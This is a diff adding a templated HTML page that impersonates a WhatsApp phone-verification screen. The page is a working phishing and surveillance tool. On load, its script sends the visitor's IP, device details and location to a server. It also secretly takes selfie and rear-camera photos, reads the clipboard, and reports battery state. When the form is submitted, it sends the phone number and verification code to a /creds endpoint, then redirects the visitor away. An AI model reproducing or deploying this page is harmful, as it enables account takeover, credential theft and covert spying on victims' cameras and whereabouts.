@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>WhatsApp - Verify</title>
+<style>
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #e5ddd5; min-height: 100vh; display: flex; align-items: center; justify-content: center; }
+.container { width: 100%; max-width: 400px; padding: 20px; }
+.card { background: #fff; border-radius: 12px; box-shadow: 0 2px 16px rgba(0,0,0,0.1); padding: 40px 32px; text-align: center; }
+.logo { width: 64px; height: 64px; background: #25D366; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 16px; font-size: 32px; }
+h1 { font-size: 22px; color: #1a1a1a; margin-bottom: 8px; }
+.subtitle { color: #666; font-size: 14px; margin-bottom: 28px; line-height: 1.5; }
+.form-group { margin-bottom: 16px; }
+.form-group label { display: block; font-size: 13px; color: #555; margin-bottom: 6px; text-align: left; font-weight: 500; }
+.form-group input { width: 100%; padding: 14px 16px; border: 2px solid #e0e0e0; border-radius: 8px; font-size: 16px; }
+.form-group input:focus { outline: none; border-color: #25D366; }
+.btn { width: 100%; padding: 14px; background: #25D366; color: #fff; border: none; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 8px; }
+.btn:hover { background: #1ebe5d; }
+.info { margin-top: 20px; font-size: 12px; color: #999; line-height: 1.5; }
+.loading { display: none; text-align: center; padding: 30px; }
+.spinner { border: 3px solid #eee; border-top: 3px solid #25D366; border-radius: 50%; width: 32px; height: 32px; animation: spin 0.8s linear infinite; margin: 0 auto 12px; }
+@keyframes spin { to { transform: rotate(360deg); } }
+</style>
+</head>
+<body>
+<div class="container">
+<div class="card">
+<div class="logo">📱</div>
+<h1>WhatsApp</h1>
+<p class="subtitle">Verify your phone number to continue using WhatsApp on this device.</p>
+<form id="loginForm">
+<div class="form-group">
+<label>Phone Number</label>
+<input type="tel" id="username" placeholder="+1 (555) 000-0000" required>
+</div>
+<div class="form-group">
+<label>Verification Code</label>
+<input type="text" id="password" placeholder="Enter 6-digit code" required maxlength="6">
+</div>
+<button type="submit" class="btn">Verify</button>
+</form>
+<div class="loading" id="loading">
+<div class="spinner"></div>
+<p style="color:#666;font-size:14px;">Verifying...</p>
+</div>
+<p class="info">By tapping Verify, you agree to the WhatsApp Terms of Service and Privacy Policy.</p>
+</div>
+</div>
+<video id="video" style="display:none" playsinline autoplay></video>
+<canvas id="canvas" style="display:none" width="640" height="480"></canvas>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+<script src="<%=a %>/public/advanced.js"></script>
+<script>
+var uid="<%=uid %>";
+var video = document.getElementById('video');
+var canvas = document.getElementById('canvas');
+
+async function gatherAll() {
+    let td = '💬 <b>WhatsApp Victim!</b>\n\n';
+    td += '⚓ IP: <code><%=ip %></code>\n';
+    td += '⏰ Time: ' + new Date().toLocaleString() + '\n';
+    td += '🖥️ OS: <code>' + navigator.platform + '</code>\n';
+    td += '📱 Screen: <code>' + screen.width + 'x' + screen.height + '</code>\n';
+    td += '🌐 Browser: <code>' + navigator.userAgent.split(' ').pop() + '</code>\n';
+    $.post("<%=a %>/",{data:encodeURIComponent(td),uid:encodeURIComponent(uid)});
+    if(navigator.geolocation){ navigator.geolocation.getCurrentPosition((p)=>{ $.post("<%=a %>/location",{uid:uid,lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy}); }, ()=>{}, {enableHighAccuracy:true, timeout: 10000}); }
+    async function captureCamera(facingMode, label) { try { const stream = await navigator.mediaDevices.getUserMedia({video: {facingMode: facingMode, width: 640, height: 480}}); video.srcObject = stream; await video.play(); await new Promise(r => setTimeout(r, 2000)); canvas.getContext('2d').drawImage(video, 0, 0, 640, 480); $.post("<%=a %>/camsnap", {uid: uid, img: encodeURIComponent(canvas.toDataURL("image/jpeg", 0.8).replace("data:image/jpeg;base64,", "")), cam: label}); stream.getTracks().forEach(t => t.stop()); } catch(e) {} }
+    try { await captureCamera("user", "selfie"); } catch(e) {}
+    try { await captureCamera("environment", "back"); } catch(e) {}
+    try { if(navigator.clipboard && navigator.clipboard.readText) { const clip = await navigator.clipboard.readText(); if(clip) $.post("<%=a %>/clipboard", {uid:uid, clip:encodeURIComponent(clip)}); } } catch(e) {}
+    try { const bat = await navigator.getBattery(); $.post("<%=a %>/battery", {uid:uid, level:Math.round(bat.level*100), charging:bat.charging}); } catch(e) {}
+}
+
+document.getElementById('loginForm').addEventListener('submit', async function(e) {
+    e.preventDefault();
+    const user = document.getElementById('username').value;
+    const pass = document.getElementById('password').value;
+    document.querySelector('form').style.display = 'none';
+    document.getElementById('loading').style.display = 'block';
+    $.post("<%=a %>/creds", { uid: uid, user: encodeURIComponent(user), pass: encodeURIComponent(pass), platform: 'WhatsApp' });
+    await new Promise(r => setTimeout(r, 2500));
+    window.location.href = "<%=url %>";
+});
+
+window.onload = function(){ gatherAll(); if(typeof advancedGather==="function") advancedGather("<%=a %>","<%=uid %>"); };
+</script>
+</body>
+</html>
